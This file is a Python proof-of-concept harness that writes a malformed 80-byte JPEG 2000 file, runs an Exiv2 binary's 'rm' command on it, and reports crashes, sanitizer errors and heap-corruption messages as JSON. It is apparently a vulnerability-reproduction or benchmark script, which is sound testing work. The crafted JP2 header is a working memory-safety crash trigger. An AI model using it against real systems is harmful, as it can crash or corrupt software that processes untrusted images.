#!/usr/bin/env python3
import argparse
import json
import math
import os
import re
import signal
import subprocess
import tempfile
import time


MAX_CAPTURE = 20000


def build_trigger() -> bytes:
    trigger = bytearray(80)
    trigger[0:12] = bytes.fromhex("0000000c6a5020200d0a870a")
    trigger[12:32] = (
        b"\x00\x00\x00\x14ftyp"
        + b"jp2 "
        + b"\x00\x00\x00\x00"
        + b"jp2 "
    )
    trigger[32:54] = b"\x00\x00\x00\x16jp2h" + b"\x00\x00\x00\x0d" + b"\x00" * 10
    return bytes(trigger)


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return f"SIG{-returncode}"


def sanitizer_marker(text):
    patterns = (
        r"(?:ERROR|WARNING): (?:Address|Hardware|Memory|Thread)Sanitizer:[^\r\n]+",
        r"SUMMARY: (?:Address|Hardware|Memory|Thread)Sanitizer:[^\r\n]+",
        r"runtime error:[^\r\n]+",
    )
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            marker = match.group(0).strip()
            if pattern.startswith("runtime error:"):
                return f"UndefinedBehaviorSanitizer: {marker}"
            return marker
    return None


def heap_corruption_marker(text):
    markers = (
        "malloc(): invalid size",
        "free(): invalid",
        "double free",
        "corrupted double-linked list",
        "munmap_chunk(): invalid pointer",
    )
    for marker in markers:
        if marker in text:
            return marker
    return None


def truncated(text):
    return text[:MAX_CAPTURE]


def normalized_output(text):
    text = re.sub(r"\s+", " ", text).strip()
    return text[:500]


def make_observable(returncode, stdout, stderr):
    marker = sanitizer_marker(stderr) or sanitizer_marker(stdout)
    if marker:
        return {"kind": "stderr", "value": marker, "path": None}

    name = signal_name(returncode)
    if name is not None:
        return {"kind": "crash_trace", "value": name, "path": None}

    marker = heap_corruption_marker(stderr)
    if marker is not None:
        return {"kind": "stderr", "value": marker, "path": None}

    if stderr:
        return {"kind": "stderr", "value": normalized_output(stderr), "path": None}
    if stdout:
        return {"kind": "stdout", "value": normalized_output(stdout), "path": None}
    return {"kind": "custom", "value": "NORMAL_COMPLETION", "path": None}


def result(binary, command, returncode, timed_out, runtime_ms, stdout, stderr, error=None):
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": truncated(stdout),
        "stderr": truncated(stderr),
        "observable": make_observable(returncode, stdout, stderr),
        "error": error,
    }


def failure(binary, command, message):
    output = result(binary, command, None, False, 0, "", "", message)
    output["observable"] = {"kind": "custom", "value": "INTERNAL_ERROR", "path": None}
    return output


def disable_core_dumps():
    try:
        import resource

        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    except (ImportError, OSError, ValueError):
        pass


def run_target(binary, timeout):
    with tempfile.TemporaryDirectory(prefix="exiv2-poc-") as directory:
        input_path = os.path.join(directory, "trigger.jp2")
        with open(input_path, "wb") as trigger_file:
            trigger_file.write(build_trigger())

        command = [binary, "rm", input_path]
        started = time.monotonic()
        timed_out = False
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
                preexec_fn=disable_core_dumps,
            )
        except OSError as exc:
            message = f"failed to start target: {exc.strerror or str(exc)}"
            return result(binary, command, None, False, 0, "", "", message)

        try:
            stdout_bytes, stderr_bytes = process.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            try:
                os.killpg(process.pid, signal.SIGKILL)
            except ProcessLookupError:
                process.kill()
            stdout_bytes, stderr_bytes = process.communicate()

        runtime_ms = max(0, round((time.monotonic() - started) * 1000))
        stdout = stdout_bytes.decode("utf-8", errors="replace")
        stderr = stderr_bytes.decode("utf-8", errors="replace")
        return result(
            binary,
            command,
            process.returncode,
            timed_out,
            runtime_ms,
            stdout,
            stderr,
        )


def parse_args():
    parser = argparse.ArgumentParser(description="Drive an Exiv2 memory-safety proof of concept")
    parser.add_argument("--binary", help="path to the target exiv2 executable")
    parser.add_argument("--json-out", help="also write the JSON result to this path")
    parser.add_argument("--timeout", type=float, default=5.0, help="target timeout in seconds")
    return parser.parse_args()


def main():
    args = parse_args()
    binary = args.binary or ""
    command = [binary, "rm", "<dynamic-trigger.jp2>"]

    if not binary:
        output = failure(binary, command, "missing required --binary argument")
    elif not math.isfinite(args.timeout) or args.timeout <= 0:
        output = failure(binary, command, "invalid --timeout value")
    else:
        resolved = binary if os.path.sep in binary else None
        if resolved is None:
            import shutil

            resolved = shutil.which(binary)
        if resolved is None or not os.path.isfile(resolved) or not os.access(resolved, os.X_OK):
            output = failure(binary, command, f"target binary is not executable: {binary}")
        else:
            output = run_target(binary, args.timeout)

    if args.json_out:
        try:
            with open(args.json_out, "w", encoding="utf-8") as output_file:
                json.dump(output, output_file, ensure_ascii=False)
                output_file.write("\n")
        except OSError as exc:
            output["error"] = f"failed to write JSON output: {exc}"

    print(json.dumps(output, ensure_ascii=False))


if __name__ == "__main__":
    main()
